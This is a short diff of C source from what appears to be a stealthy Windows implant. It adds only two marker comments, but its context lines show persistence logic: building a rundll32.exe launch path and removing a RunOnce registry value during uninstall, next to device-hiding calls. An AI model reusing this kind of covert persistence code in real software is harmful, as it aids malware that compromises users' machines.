@@ -169,6 +169,7 @@ BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char 
 			return FALSE;
 	}
 
+	// XXX-CRISI2s
 	// Path a rundll32.exe
 	memset(key_value, 0, sizeof(key_value));
 	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
@@ -409,6 +410,7 @@ BOOL DFUninstall(HideDevice *pdev_unhook, unsigned char *core_path, unsigned cha
 		pdev_unhook->df_freeze();
 		return FALSE;
 	}
+	// XXX-CRISI2
 #ifdef RUN_ONCE_KEY
 	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
